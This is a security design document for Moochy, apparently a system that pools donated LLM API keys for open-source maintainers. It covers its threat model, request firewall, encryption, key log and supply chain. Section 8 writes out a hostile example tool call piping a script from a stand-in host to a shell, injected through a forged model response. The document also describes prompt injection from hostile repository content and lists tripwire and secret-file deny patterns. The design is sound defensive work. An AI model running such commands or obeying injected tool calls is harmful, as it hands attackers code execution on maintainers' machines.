# 06 — Security and Trust

> Who can hurt whom, how, and what stops them. Covers the threat model, keys, identity and owner-signed approvals, end-to-end encryption, the Worker's request firewall, the output-injection risk to maintainers, accountability, the key log, privacy, supply chain, local hardening, and provider-terms guardrails.

---

## 1. Assets

| Asset | Owner | Worst outcome if lost |
|---|---|---|
| Provider API keys | Donor | Unbounded spend; account ban by the provider |
| Donor budget | Donor | Overspend beyond the pledge |
| Maintainer code and prompts | Maintainer | Leak of unreleased code, accidental secrets in context |
| Maintainer machine integrity | Maintainer | **Remote code execution via a poisoned agent response** |
| Device private keys | Each user | Impersonation, forged receipts or approvals |
| Relay log and catalog signing keys | Operator | Forged history or prices (detectable by monitors and the public anchor) |
| Ledger integrity | Everyone | Fake donations, stolen budget, false leaderboards |
| User identities (PII) | Everyone | Privacy harm |

## 2. Adversaries

| ID | Adversary | Capabilities assumed |
|---|---|---|
| A1 | Malicious maintainer / member | Controls their Gateway fully; can send any bytes |
| A2 | Malicious donor | Controls their Worker fully; can return any bytes, lie about usage |
| A3 | Malicious or compromised relay operator (moochy.dev or any self-hoster) | Full control of the Relay and its database; cannot break cryptography; cannot modify Nodes already installed |
| A4 | Network attacker | Can observe, delay, and drop traffic; cannot break TLS |
| A5 | Web attacker | Can make victims visit pages (CSRF, XSS attempts, DNS rebinding against localhost) |
| A6 | Local unprivileged process or other user on a maintainer's machine | Can reach `127.0.0.1` ports and race to bind them |
| A7 | Supply-chain attacker | Targets the release pipeline or dependencies |
| A8 | Sybil / spammer | Creates many accounts, fake repos, fake donors |
| A9 | Hostile repository content | A malicious PR or issue that steers the maintainer's agent (prompt injection, symlinks) |

---

## 3. Threat table

| # | Threat | Adv. | Mitigation | Residual risk |
|---|---|---|---|---|
| T1 | Steal a donor's provider key | A1–A4 | Key never leaves the donor's machine (I1); OS keychain; sent only to allowlisted provider hosts | Malware on the donor's machine (out of scope) |
| T2 | Make the donor's account execute things server-side (code execution, web fetch, MCP connector, paid add-ons) | A1 | **Request firewall** (§7): strict allowlist, recursive, with provider headers sealed and allowlisted too | Firewall bugs → fuzzing + two-person review of allowlist changes |
| T3 | Read data in the donor's provider account (file ids, stored responses, batches) | A1 | Firewall rejects any file reference, stored-response reference, or non-chat endpoint, including inside nested content | — |
| T4 | Overspend a donor | A1, A3 | Three-layer caps ([05 §6](05-ledger-and-accounting.md)); deterministic, Worker-checked input estimate; route header bound to the body | The sum of overages of open attempts |
| T5 | Declare a cheap model or small input, send something expensive | A1 | Worker route/body consistency check, exact estimate match ([03 §7](03-wire-protocol.md)) | — |
| T6 | Read prompts and outputs in transit or at rest | A3, A4 | End-to-end envelopes with **per-body request keys and per-attempt response keys** ([03 §6](03-wire-protocol.md)); the Relay holds no keys; the database stores no content | Metadata (sizes, timing, models) |
| T7 | Get content sealed to a key the Relay controls (fake device on a real account, or a fake "approved donor") | A3 | **Key log** with owner-signed approvals (§10): Gateways seal only to keys logged for users holding an **owner-signed `DONOR_APPROVED`** for the repo; every Node alerts on unknown keys on its own account; the owner's Node alerts on approvals or repo claims it did not sign; checkpoints are publicly anchored | A Relay can still attempt a MITM, but only by publishing evidence that real users' Nodes flag within one checkpoint interval |
| T8 | **Return a poisoned response that makes the maintainer's agent run malicious tool calls** | A2 | §8: owner approval of each donor, pinned donors, tool-call checks and tripwire, **signed progress checkpoints on every tool call**, guidance to keep human approval on | **Highest residual risk in the system.** It cannot be eliminated without verified compute (§15) |
| T9 | Run inference on donor keys as the Relay, replay tasks, or charge one repo's pledge for another's task | A3 | **Gateway task signatures**, owner-signed `MEMBER_ADDED`, pledge↔repo check, ULID freshness, served-task set at the Worker ([03 §7.2](03-wire-protocol.md)) | — |
| T10 | Garbage output, cheaper model, or inflated usage to farm the leaderboard | A2 | Gateway checks commitments, usage bands, and the reported model; signed disputes; leaderboard counts only undisputed receipts | A donor can still serve low-quality output for real money (no incentive) |
| T11 | Forge receipts, approvals, or rewrite history | A3 | Donor-signed receipts and projections; owner-signed approvals; append-only key log with signed checkpoints anchored externally | Censorship (omitting projections from public pages) is possible but visible to the parties holding the receipts |
| T12 | Relay a stolen login, or replay an auth signature | A3, A4 | Signature covers the **origin the Node dialed** and the TLS channel binding ([03 §3](03-wire-protocol.md)) | — |
| T13 | Use a stolen device | any | `moochy logout` / web revoke → `KEY_REVOKED`; the Relay drops the device at once | Window until the user notices |
| T14 | Use the maintainer's local Gateway from another process, user, or website | A5, A6 | Loopback only; repo-scoped random local tokens; Host-header check against DNS rebinding; no CORS; port held by the OS service manager; `moochy doctor` checks the port owner's uid (§13) | Same-user malware (out of scope) |
| T15 | Exfiltrate local files through MCP `files` (traversal, symlinks, injected paths) | A6, A9 | Root = git top-level bound to the token ∩ client roots; realpath containment; no symlinks; deny `.git/**` and secret-shaped files; `git check-ignore` (§13) | Secrets in normal tracked files (scrubber is best-effort) |
| T16 | CSRF / XSS on the web dashboard | A5 | SameSite=Lax cookies; state changes require `HX-Request` + Origin check; strict CSP; auto-escaping templates | — |
| T17 | Malicious client release | A7 | Signed releases with provenance, reproducible Linux builds, dependency vetting, no silent auto-update (§12) | A compromised upstream crate |
| T18 | Sybil accounts flooding pledges or claims | A8 | GitHub/GitLab identity; repo claims need admin permission; owner approval of donors; rate limits | Determined attacker with aged accounts |
| T19 | Donor's provider account banned because of a maintainer's prompts | A1 | Donors pledge only to repos they choose and that approve them; `metadata.user_id` pseudonymous attribution; local journal | Provider decisions are outside Moochy's control → explicit donor consent |
| T20 | Secrets from the maintainer's environment leaking to donors | A1 (accidental), A9 | Gateway **secret scrubber** before sealing (also on MCP files) | Novel secret formats |
| T21 | Prompt-cache timing side channel between members sharing a donor key | A1 | Only reveals whether an *exact* prefix is cached; prefixes include per-repo content | Accepted (low) |
| T23 | Impersonation through look-alike, case-variant, reserved, or recycled usernames | A8 | Unique ASCII-only lowercase handles (case-insensitive uniqueness), reserved words, permanent tombstones for released handles, control characters escaped everywhere they are printed (`spec/CONTRACT.md` §11) | Visually similar ASCII handles (`rn` vs `m`) |
| T22 | Denial of service on the Relay | any | Per-IP connection limits, per-device rate limits, byte budgets for buffered bodies, sheddable submit queue | Large volumetric attacks → optional CDN/DDoS front |

---

## 4. Key management

### 4.1 Device keys

- Created by `moochy login` on the device and **never exported**: one Ed25519 signing key and one X25519 encryption key.
- Stored in the OS keychain (macOS Keychain, Windows Credential Manager, Linux Secret Service). **Headless fallback:** a file encrypted with a passphrase-derived key (scrypt), or `systemd-creds` / TPM-bound credentials. This replaces the draft's custom AES-256-GCM store, which forced a passphrase prompt on every daemon start, an unacceptable UX for an always-on service.
- **Registration** goes through the device-approval flow: the Node shows a short code, the user approves in the signed-in browser, and the Relay binds `{device, user, sign_pub, enc_pub, roles, suite}` and appends a `KEY_ADDED` entry (with a proof-of-possession signature by the new key) to the key log.
- **Rotation**: `moochy keys rotate` registers a new device record and revokes the old one after a 24 h grace period. Both are logged.
- **Revocation**: `KEY_REVOKED` takes effect immediately at the Relay and is published in the key log.

### 4.2 Provider API keys

- Added with `moochy keys add <provider>` (interactive prompt, never a CLI argument, so it stays out of shell history) and stored in the keychain.
- Validated on add and periodically with a **free** call to the provider's models endpoint. This also tells the Worker which models the key can really use, and the Worker advertises exactly those.
- **Never** sent to the Relay, never logged, never included in crash reports (redaction is unit-tested).

### 4.3 Relay keys

| Key | Purpose | Storage | Rotation |
|---|---|---|---|
| Log signing key (Ed25519, signed-note format) | Key-log checkpoints | Generated offline; encrypted file or KMS at boot | Yearly or on incident; both keys sign during the transition |
| Catalog signing key | Price catalog | Same | Same |
| TLS keys | Transport | ACME autocert | Automatic |

No Relay key can decrypt user content. **That is the point.**

---

## 5. Identity, repo ownership, and authorization

| Subject | Authenticates with | Authorized for |
|---|---|---|
| Web user | GitHub / GitLab OAuth (identity + public repo metadata) → session cookie | Their pledges and devices; viewing their repos' consoles |
| Node | Device signature with channel binding ([03 §3](03-wire-protocol.md)) | Roles granted at approval: `gateway`, `worker` (optionally scoped to one repo) |
| Repo owner | At claim time, the provider API confirms **admin** permission with the user's OAuth token (used once, not stored); the owner's Node then **signs** `REPO_CLAIMED` | Approving donors and members **by signature** |
| Member | An owner-signed `MEMBER_ADDED` entry in the key log | Consume the repo's pool within their quota |

**Approvals are signed by the owner's device, not just clicked on a website.** The web console lists pending donors and members, and approval happens with `moochy approve <name>` / `moochy members add <user>` (or by confirming the prompt the Node shows in `moochy status`). The owner's Node signs the entry, the Relay appends it to the key log, and Gateways and Workers verify it themselves. The Relay can **show** a request but cannot **forge** an approval. The draft's idea of "anyone with push access is automatically a member" is dropped: it would make membership relay-asserted.

**Public repositories only** on the public instance. Moochy's purpose is open source, and public visibility makes the use auditable. Private pools are better served by self-hosted relays.

---

## 6. End-to-end encryption: what it buys and what it costs

**Buys:** the Relay, its operator (moochy.dev or any self-hoster), its hosting provider, and anyone who steals its database learn nothing about prompts or outputs. The Relay is open source, but nobody can prove which binary a server is actually running. End-to-end encryption makes that question irrelevant for privacy: **users never have to trust the operator, only the open-source client on their own machine.**

**Costs, and how they are paid:**

| Cost | Resolution |
|---|---|
| Failover requires knowing recipients upfront | Recipient-independent body + cheap per-recipient wraps; per-attempt response keys keep failover safe ([03 §6](03-wire-protocol.md)) |
| Anyone with a public key can build an envelope | Gateway task signatures + owner-signed membership ([03 §7.2](03-wire-protocol.md)) |
| The Relay cannot validate content | Validation moves to the Worker (firewall) and the Gateway (scrubber, tool-call checks) |
| The Relay cannot moderate content | Deliberate. Providers run their own safety systems on every call; owners approve donors and donors choose repos. Documented in the terms |
| The Relay cannot meter tokens | Usage comes from donor-signed receipts, checked by the maintainer's Gateway |

---

## 7. The Worker's request firewall

The draft's claim "text-only, zero arbitrary execution" is **not automatically true** of modern provider APIs. They offer server-side code execution, web fetch and search, MCP connectors that make the provider connect to arbitrary URLs, file storage, stored responses, batch jobs, paid plugins, and premium speed tiers. A relayed request could turn the donor's account into a remote execution platform, an exfiltration channel for files in the donor's account, or a cost multiplier.

**Rule: allowlist, never denylist, applied recursively.** Each provider adapter defines exactly which endpoints, headers (and header values), top-level fields, content-block types (including those nested in `tool_result` and documents), and tool types are allowed. **Anything unknown is rejected** with `nack{code: firewall}`. The precise reason ("field `mcp_servers` is not allowed") is sealed to the Gateway; the Relay sees only the code.

### 7.1 Anthropic Messages adapter (v1 policy)

| Element | Policy | Why |
|---|---|---|
| Endpoint `POST /v1/messages` | allow | The product |
| `count_tokens` and every other endpoint (batches, files, models, skills, agents, …) | **deny** | `count_tokens` is answered locally by the Gateway; the rest may touch the donor's account data |
| Provider headers (API version, beta values) | Sealed in the inner payload, covered by `req_commit`, **allowlisted per catalog version**; unknown beta values rejected | Some beta headers change billing or features on their own (e.g. long-context pricing), so they need the same allowlist as the body |
| `model` | allow if in pledge policy **and** offered by this key (after slug mapping) | — |
| `max_tokens` | required; ≤ catalog `max_output` | Bounds cost |
| `messages`, `system`, `stop_sequences`, sampling parameters the model accepts, `stream`, `metadata` | allow | Plain inference |
| `thinking`, `output_config.effort` | allow, effort ≤ pledge `max_effort` | Cost bound |
| `output_config.format` (structured outputs) | allow | Text only |
| `cache_control` (top-level and per block) | allow | Saves donors money |
| Content blocks: `text`, `image` (base64), `document` (base64 or plain text), `tool_use`, `tool_result`, `thinking`, `redacted_thinking` | allow; `image` needs the `images` flag; `document` needs the `documents` flag (strict level denies PDFs) | Inline data only |
| Any content whose source is a **file id** or a **URL**, at any nesting depth | **deny** | Reads the donor's file store or makes the provider fetch URLs |
| `tools[]` with `input_schema` (custom tools) | allow | Executed by the **maintainer's** harness, never by the donor or the provider |
| Anthropic-defined **client-executed** tools (bash, text editor, memory, client-side computer use) | allow | Executed on the maintainer's side; the donor only relays text |
| **Server-executed tools** (web search, web fetch, code execution, tool search, advisor, server-hosted computer use) | **deny** (no opt-in in v1) | Execution or extra billed model calls on the donor's account |
| `mcp_servers` / MCP toolsets | **deny** | The provider would connect to arbitrary servers on the donor's behalf |
| `container`, skills | **deny** | Server-side execution environment |
| Server-side model fallbacks on refusal | **deny** | Would bill a model outside the pledge allowlist |
| `speed: fast` | deny unless the pledge has the `fast` flag | Price multiplier |
| `service_tier`, `inference_geo` | deny unless explicitly allowed in policy | Price and data-residency are the donor's call |

**Safe mutations** (the only ones the Worker performs; `req_commit` is computed over the body *before* them):
- set `metadata.user_id` to a pseudonymous `H(repo_id ‖ member_id)`, so the donor's provider account can attribute abuse to a specific end user;
- map the public model id to the provider's model id through the signed catalog.

### 7.2 OpenAI-compatible adapters (OpenAI, OpenRouter, DeepSeek, vetted hosts)

Allow `POST /v1/chat/completions` with messages, function tools, standard sampling, and reasoning-effort parameters. **Deny:** hosted or built-in tools (web search, file search, code interpreter, computer use), web-search options, `n > 1` (multiplies output beyond `max_tokens`), predicted outputs (billed as output), `service_tier`, audio and other modalities, any file or stored-response reference, and non-chat endpoints. **Safe mutations:** force `store: false` where storage exists, and **turn on stream usage reporting** so every streamed receipt has real usage.

| Provider | Extra rules |
|---|---|
| **OpenRouter** (OpenAI-compatible and Anthropic-compatible endpoints) | Deny `models[]` fallback lists, `route`, `plugins` (web search, file parsing billed per page), "online" and other uncatalogued model variants. The Worker sets OpenRouter's **max-price** preference to the catalog price, so upstream routing can never exceed the reservation. Settlement uses OpenRouter's reported cost ([05 §3](05-ledger-and-accounting.md)) |
| **DeepSeek** (OpenAI-compatible and Anthropic-compatible endpoints) | Plain chat and reasoning models; text only. Reasoning output is billed as output, covered by `max_tokens` |
| **Other OpenAI-compatible hosts** | Only hosts on the vetted list, each with its own table |

The exact endpoints and field names for each provider are pinned in Phase 0.

### 7.3 Firewall engineering

- Written as data (a per-adapter table of allowed paths, types, and header values) interpreted by a small recursive validator. Allowlist changes show up as small, reviewable diffs.
- **Fuzzed** continuously with a corpus of real client traffic (Claude Code, OpenCode, Aider, Cline, …) plus mutations, including deeply nested content.
- **Two-person review** for any change that widens an allowlist.
- **Opt-in telemetry**: Workers that opt in report *field names only* (never values) of rejections, so the team learns quickly when a popular client starts sending a new harmless field.
- **Donor strictness levels:** `strict` (default; the tables above) or `paranoid` (also deny images and documents, lower `max_tokens` ceiling).

---

## 8. The output-injection risk to maintainers (the draft's blind spot)

**Scenario:** a malicious donor's Worker ignores the provider and returns a fabricated stream that looks like a normal assistant turn containing a tool call such as `bash {"command": "curl https://evil.sh | sh"}`. The maintainer's agent runs it if it auto-approves commands. The same applies to subtle backdoors in code the agent writes, and to text returned by the MCP `moochy_delegate` tool into an agent that has tools.

No signature can prove the output came from the real model (§15). Defense in depth:

| Layer | Mechanism | Default |
|---|---|---|
| **Who can serve you** | The repo owner **approves each donor by signature** (§5). Most donors are known community members or sponsors | Approval required |
| **Pinned donors** | A maintainer can restrict a session or the whole repo to named donors | off |
| **Structural checks on tool calls** | The Gateway holds each tool call until its end (Anthropic `tool_use` blocks; OpenAI `tool_calls` per index; text still streams immediately) and rejects calls whose **name is not in the request's `tools[]`**, whose input **fails the declared `input_schema`**, block types the firewall forbids (`server_tool_use`, `mcp_tool_use`, server tool results), and responses whose model does not match the requested model | on |
| **Signed tool calls** | A tool call is released only after a **Worker progress signature** covering it is verified ([03 §12.3](03-wire-protocol.md)) | on |
| **Tripwire (a speed bump, not a guarantee)** | Pattern scan of tool-call inputs for well-known dangerous shapes (pipe-to-shell, credential paths, persistence locations, encoded payloads, raw-IP connections); on a hit, the call is replaced by an error tool result with a visible warning | on (warn + block) |
| **Untrusted-content envelope for MCP results** | `moochy_delegate` results are wrapped in an explicit "untrusted content from donor X" frame and scanned the same way | on |
| **Human approval** | Onboarding and `moochy connect` state plainly: "When using pooled compute, keep command approval on in your agent" | guidance |
| **Accountability** | Every tool call and every response is bound to the donor's signature over the exact bytes. The maintainer can reveal the evidence (§9) → ban and public record | always |

A capable attacker can evade pattern scanning. The plan does not pretend otherwise: the tripwire catches lazy attacks, and signatures plus approvals make careful ones attributable and costly.

---

## 9. Accountability and disputes

1. `moochy report <task_id>` packages the evidence: the receipt, the progress checkpoints, the response bytes, and **only the salt needed** (`S_resp`, derived separately from `S_req`, so revealing it does not expose the request).
2. The operator (or anyone with the bundle) verifies the donor's signatures and recomputes `resp_commit` → proof that the donor sent exactly those bytes.
3. Outcomes: warning, revocation of approval by the owner, or ban (`KEY_REVOKED` for all of the donor's devices; pledges Ended), recorded as a pseudonymous `MODERATION` entry.
4. **Disputes against maintainers** (for example, false disputes to hurt a donor's ranking) use the same process in reverse, with the donor's local journal and the signed receipt as evidence.

---

## 10. The key log (transparency for identities, approvals, and prices)

### 10.1 Structure

One **append-only Merkle log** (RFC 6962-style tree, using the Go checksum database's `x/mod/sumdb/tlog` hashing and proofs with a C2SP tlog-tiles path layout, or the transparency-dev Tessera library), with checkpoints in the signed-note format.

| Entry | Signed by |
|---|---|
| `KEY_ADDED` / `KEY_REVOKED` | Relay (binding to a user) + the new key (proof of possession) |
| `REPO_CLAIMED` | Relay (admin check) + the owner's device |
| `DONOR_APPROVED` / `DONOR_REVOKED` | The owner's device |
| `MEMBER_ADDED` / `MEMBER_REMOVED` | The owner's device |
| `CATALOG` | Relay catalog key |
| `MODERATION` | Relay |

Volume is small (≈ 100k entries per year), so **every Node mirrors it fully** and checks completeness for everything it cares about:

- **Every Node** alerts on any key on its own account that it did not create ("A new device `xyz` was added to your account at 14:02. If this wasn't you, run `moochy keys revoke xyz`").
- **The owner's Node** alerts on any `REPO_CLAIMED`, approval, or membership for its repos that it did not sign.
- **Gateways** seal only to worker keys that are logged, unrevoked, and belong to a donor with an owner-signed `DONOR_APPROVED` for the repo.
- **Workers** accept tasks only from Gateway keys whose user has an owner-signed `MEMBER_ADDED` (or is the owner).

**Checkpoints** are signed every 60 s while the log grows (only for sizes already replicated, [05 §7](05-ledger-and-accounting.md)), pushed to Nodes, and checked with consistency proofs. **External anchoring from day one:** hourly checkpoints are committed to a public Git repository, and Nodes compare the relay-served checkpoints against it. Any fork or rewrite is visible to anyone who ever fetched the anchor. Independent witness cosignatures (C2SP witness protocol) are added after beta.

### 10.2 Receipts are not in the log in v1

Receipts stay with the two parties and the Relay database. The public audit feed shows **donor-signed projections** ([03 §12.1](03-wire-protocol.md)), verifiable against the donor's logged key. A public **receipt log** (Merkle tree of projections with inclusion proofs) is a post-beta addition, triggered by demand for third-party audit of omissions. Until then, a Relay could hide projections from public pages, but it cannot forge or alter them, and both parties keep the full receipts.

### 10.3 No personal data in the log

Append-only and public means **forever**. So the log contains only pseudonymous ids, device public keys, repo ids, signatures, and catalog data. The mapping `pseudonym → username/avatar` lives in the mutable database and is deleted when an account is deleted.

---

## 11. Privacy

| Data | Stored where | Retention | Public? |
|---|---|---|---|
| Prompts / outputs | Nowhere on the Relay. Donor and maintainer local journals only (full text opt-in) | User-controlled | No |
| Task metadata (model, sizes, timings, cost) | Relay DB | 90 days raw, then daily aggregates | Aggregates only |
| Full receipts | Relay DB + the two parties | As long as the account exists | No |
| Receipt projections | Relay DB | Forever | Yes (pseudonymous, daily granularity, no device ids or timestamps) |
| Presence (which donor is online) | Relay memory | Live only | **Aggregated by default**; per-donor presence only if the donor opts in |
| IP addresses | Connection logs | 7 days | No |
| OAuth identity | Relay DB | Until account deletion | Per the pledge's visibility setting |

The draft's public "node-alpha … RTT: 12ms" panel revealed when a specific person's machine is on. It is now **opt-in**.

---

## 12. Supply chain: open source is necessary, not sufficient

Everything is open source (relay, client, spec) under Apache-2.0 OR MIT. Anyone can audit the code, self-host a relay, or write a compatible client. But a user cannot verify which code a remote server runs, so the design never asks users to trust the operator for confidentiality. It asks them to trust the client binary on their own machine, which they *can* verify:

- **Signed releases** (Sigstore keyless, tied to the CI identity) with **SLSA provenance**. Users verify **externally** (`gh attestation verify` or `cosign verify-blob`). A binary checking itself would prove nothing.
- **Reproducible builds** for the Linux musl artifacts (the ones donors run on servers) are required for beta; other platforms follow when feasible.
- **Dependency hygiene**: `cargo-deny` (licenses, advisories, bans) and `cargo-vet` audits, especially for crypto and network crates. The `hpke` crate is widely used but has not had an independent paid audit, so it is explicitly vetted.
- **Updates**: no silent auto-update. The Node says when a new version exists; `moochy update` verifies signatures before replacing itself. `hello.min_client_version` can force upgrades only for security fixes.
- **The relay too** is built and signed the same way. moochy.dev publishes the release it runs and `hello` reports it. That is a statement, not a proof, which is exactly why confidentiality never depends on it.
- **Security policy**: public `SECURITY.md`, private disclosure channel, coordinated disclosure, credit for reporters.

---

## 13. Maintainer-side hardening (Gateway and MCP door)

| Control | Detail |
|---|---|
| Loopback only | Binds `127.0.0.1` / `::1`, never `0.0.0.0` |
| Port ownership | The port is held by the OS service manager (launchd socket / systemd `.socket` unit), so no other local user can bind it while the Node restarts; `moochy doctor` checks the listening uid |
| Local tokens | Random, repo-scoped tokens (`mooch_local_…`), rotatable (`moochy env --rotate`). Clients use one as their "API key" |
| Token placement | `moochy connect --write` writes tokens only to **user-scoped** config files, or uses environment-variable indirection, or the stdio shim (authenticated by the 0600 local socket, no token needed). It refuses to write a token into any file tracked by git |
| DNS-rebinding defense | Rejects requests whose `Host` is not the loopback address and port; no CORS headers |
| MCP `files` | Allowed root = the git top-level recorded with the token at `moochy connect`, intersected with the client's MCP roots (or the shim's working directory when the client sends none); every path resolved with realpath and required to stay inside after resolution; symlinks refused; `.git/**` and secret-shaped files (`.env*`, `.npmrc`, `.netrc`, `*.pem`, `id_*`, `*.kdbx`) denied even when tracked; git-ignored files refused; total size capped (2 MiB default) |
| Secret scrubber | Before sealing (request bodies and MCP files): high-confidence patterns (cloud keys, private-key blocks, provider API keys, JWTs, `.env`-style assignments of known secret names) replaced with `[REDACTED:type]`; mode `redact` (default) or `warn` |
| Tool-call checks + tripwire | §8 |
| Own-key fallback (optional) | If the pool cannot serve, the Gateway can call the provider directly with the maintainer's own local key. Off by default |

---

## 14. Provider terms and legal guardrails

This section is for counsel review in Phase 0. It is not legal advice.

- **API keys only.** Consumer subscription credentials (chat-app logins, subscription OAuth tokens) are **refused technically**: adapters accept only API-key authentication against official API hosts.
- **The donor is the provider's customer of record.** The donor's terms with their provider govern the calls their key makes. Moochy's terms state this, and onboarding obtains explicit consent ("Requests from maintainers of repos that approve you will be sent to your provider under your account and its usage policies").
- Each provider's commercial terms and usage policies (Anthropic, OpenAI, OpenRouter, DeepSeek, every vetted host) must be reviewed for (a) serving third-party end users through one's own key, with end-user attribution like `metadata.user_id`; (b) resale restrictions (Moochy involves **no payment** between donor and maintainer and takes no cut, which matters here); (c) abuse-handling expectations.
- **Moochy never holds donors' or maintainers' money, ever.** It is free, takes no commission, and has no paid tier, which avoids payment, escrow, and tax regimes entirely. The project's own hosting is covered by open sponsorship with public accounts ([10 §10](10-operations.md)).

---

## 15. Research track: verified compute (free, opt-in)

Signatures prove *who* claimed something, not *what the provider actually returned*. Two technologies could close that gap later, offered as an **opt-in verified mode, free like everything else**:

| Approach | How it would work in Moochy | Status / cost |
|---|---|---|
| **TLS notarization (TLSNotary / MPC-TLS family)** | The Worker's TLS session to the provider runs jointly with a notary via MPC. **The Relay can act as the notary** and still learn nothing about the plaintext. The Worker gets an attestation that the response came from the provider's TLS server and discloses it selectively to the Gateway | Real and improving; currently adds significant bandwidth and latency per session. Fits small requests, not every streamed agent turn |
| **Trusted execution (confidential VMs)** | Workers run in attested enclaves; the Gateway verifies the attestation before sealing | Not viable for home donors; possible for donor-owned cloud hosts |

The receipt has a reserved optional `attestation` field. Commitments already bind the response bytes, so an attestation can be added without breaking v1.
